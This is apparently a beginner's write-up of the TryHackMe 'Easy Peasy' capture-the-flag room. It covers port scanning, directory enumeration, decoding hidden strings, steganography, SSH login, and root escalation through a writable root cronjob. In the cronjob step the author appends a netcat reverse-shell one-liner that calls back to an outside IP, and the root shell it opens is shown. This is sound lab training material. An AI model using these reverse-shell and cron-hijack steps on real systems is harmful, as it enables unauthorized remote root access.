# Easy Peasy

## nmap

nmap -sC -sV <IP> -p-

Looking at the questions and tasks, we see that one of the entries is asking for the number of ports open. I did a standard 1000 port check and my answer was wrong so I then completed an all port check. That gave me the correct answer for [Task 1] #1. This also covered [Task 1] #2 and #3. 


```
~/CTF/tryhackme/easy_peasy$ nmap -sC -sV 10.10.30.38 -p-
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-03 07:13 BST
Nmap scan report for 10.10.30.38
Host is up (0.021s latency).
Not shown: 65532 closed ports
PORT      STATE SERVICE VERSION
**/tcp    open  http    nginx *.**.*
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: nginx/*.**.*
|_http-title: Welcome to nginx!
****/tcp  open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 30:4a:2b:22:ac:d9:56:09:f2:da:12:20:57:f4:6c:d4 (RSA)
|   256 bf:86:c9:c7:b7:ef:8c:8b:b9:94:ae:01:88:c0:85:4d (ECDSA)
|_  256 a1:72:ef:6c:81:29:13:ef:5a:6c:24:03:4c:fe:3d:0b (ED25519)
*****/tcp open  http    Apache httpd 2.4.43 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Apache/2.4.43 (Ubuntu)
|_http-title: Apache2 Debian Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1968.53 seconds

```
## gobuster
Using TMUX or Terminator, once I find a directory of interest, I open a new terminal and use gobuster again. Below are the directories that were found, with child directories showing.

gobuster dir -u <IP> -w /usr/share/wordlists/dirbuster/directory-2.3-medium.txt
```
/h*****	/w******r 
```
When we investigate each index.html on the folder structure from /h*****/w******r  we see what appears to be a piece of HTML comment: 
```
<body>
<center>
<p hidden>Z********XJz**********==</p>
</center>
</body>
</html>


```
You can use GCHQ Cyberchef to decode the Base64 or you could use the commandline:
```
tryhackme/easy_peasy$ echo Z********XJz**********== | base64 --decode
****{**********}

```
Within the last folder the title name was "dead end", so for the moment I moved on and started to look at the second port running a site. Again we review the source page. We see some further code:
```

<div class="page_header floating_element">
        <img src="/icons/openlogo-75.png" alt="Debian Logo" class="floating_element"/>
        <span class="floating_element">
          Apache 2 It Works For Me
	<p hidden>its encoded with ba....:O**********X6d*********u</p>
        </span>
      </div>
```
This took me a while as I made some assumptions. I thought I checked all the variants of base??, hell I even tried to decode it with Bacon!. In the end we get the decoded directory name [Task 2] #4.
```
/n*********3*****r
```

## nikto

Nikto picked up the /h*****/w******r directories that we saw in the initial gobuster check. It also highlighted the robots.txt, which pretty much banned all searches. 

## steganography

At each level I downloaded the mainpage image (two in the coded directory - matrix and binary). I used strings command on each and you can see from the binarycodepixabay.jpg that there is something amiss from the standard strings result.
```
JFIF
$3br
%&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
	#3R
&'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
`@?*
```
On the same source page we also have a long coded piece of text that is shown as Base64 and this took up some time. If I had just read the Hint file, it would have saved me about 20 minutes!!

```
<img src="binarycodepixabay.jpg" width="140px" height="140px"/>
<p>940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81</p>
</center>
</body>
</html>
```
Following the clue, I found a GOST online decoder and got a password of sorts [Task 2] #5.
```
m*******r**********b
```

I tried this password on the binarycodepixabay.jpg image and it worked. I then stopped my Stegcracker, which had been running for the hour, and accessed the encrypted details from the foldersecrettext.txt. That will teach me!

This gave me some interesting details.
```
username:**r***
password: *****************************************************
```
The password needed some more work but was easily completed by Cyber Chef.

## ssh

Now we have a username and password we can log into the server [Task 2] #6:
```
ssh **r***@10.10.86.214 -p 6498
```
Remember we are not using the default port.

```
~/CTF/tryhackme/easy_peasy$ ssh **r***@10.10.86.214 -p 6498
The authenticity of host '[10.10.86.214]:6498 ([10.10.86.214]:6498)' can't be established.
ECDSA key fingerprint is SHA256:hnBqxfTM/MVZzdifMyu9Ww1bCVbnzSpnrdtDQN6zSek.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.86.214]:6498' (ECDSA) to the list of known hosts.
*************************************************************************
**        This connection are monitored by government offical          **
**            Please disconnect if you are not authorized	       **
** A lawsuit will be filed against you if the law is not followed      **
*************************************************************************
boring@10.10.86.214's password: 
You Have 1 Minute Before AC-130 Starts Firing
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
!!!!!!!!!!!!!!!!!!I WARN YOU !!!!!!!!!!!!!!!!!!!!
You Have 1 Minute Before AC-130 Starts Firing
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
!!!!!!!!!!!!!!!!!!I WARN YOU !!!!!!!!!!!!!!!!!!!!
boring@kral4-PC:~$ 
```
So it looks as though we are on a timer. First, I quickly check for flags.

The first flag I find is the user flag:
```
User Flag But It Seems Wrong Like It`s Rotated Or Something
s**t{***vgf**********}
```

"Rotated" could be a Caesar cipher (ROT13 isteh one I tried) whhich gave us the answer to [Task 2] #7

Still searching with the user details I check out all the website files, including the robots.txt, which gives some additional comments:
```
User-Agent:*
Disallow:/
Robots Not Allowed
User-Agent:a**********510e5********0763b250
Allow:/
This Flag Can Enter But Only This Flag No More Exceptions
```
I tried setting it up as a cookie with User-Agent, but that didn't do anything that I could see from a webpage front, so Itried a number of differet ways to see if I could check its hash. In the end I used https://md5hashing.net/ which gave me the answer to [Task 2] #2. That was almost the death of me!!

I also managed to get flag three in a similar manner but just reading the index.html files of the main folders (though I found three by reading from the console.)

## crontab

Finally the comments in the Easy Peasy main page - "Then escalate your privileges through a vulnerable cronjob" gave me an idea to review the /etc/crontab file.
```
boring@kral4-PC:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* *    * * *   root    cd /var/www/ && sudo bash .mysecretcronjob.sh
```

If we read the file, it tells us that it will actually run as root.
```
boring@kral4-PC:~$ cat /var/www/.mysecretcronjob.sh 
#!/bin/bash
# i will run as root
```
In this case if we check the file permissions we see that we can amend the file as a normal user.
```
boring@kral4-PC:~$ ls -la /var/www/.mysecretcronjob.sh 
-rwxr-xr-x 1 boring boring 33 Jun 14 22:43 /var/www/.mysecretcronjob.sh
```

If we now amend (I will append >> in this instance) the file by adding a reverse bash shell:
```
boring@kral4-PC:~$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.12.213 4445 >/tmp/f" >> /var/www/.mysecretcronjob.sh
```
We can check this again with a cat command. Once happy, we set up the netcat on port 4445.
```
~/CTF/tryhackme/easy_peasy$ nc -lnvp 4445
```
A few moments later we get the root shell.

```
~/CTF/tryhackme/easy_peasy$ nc -lnvp 4445
listening on [any] 4445 ...
connect to [10.9.12.213] from (UNKNOWN) [10.10.111.59] 49166
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)

```
With root we now look for the final flag which we find in the usual place, just hidden!!

```
flag{6*******************649********5}
```

I loved this room. Although I am a beginner, I actually got through this room without any write ups. It is true, the more you do, the better you become!




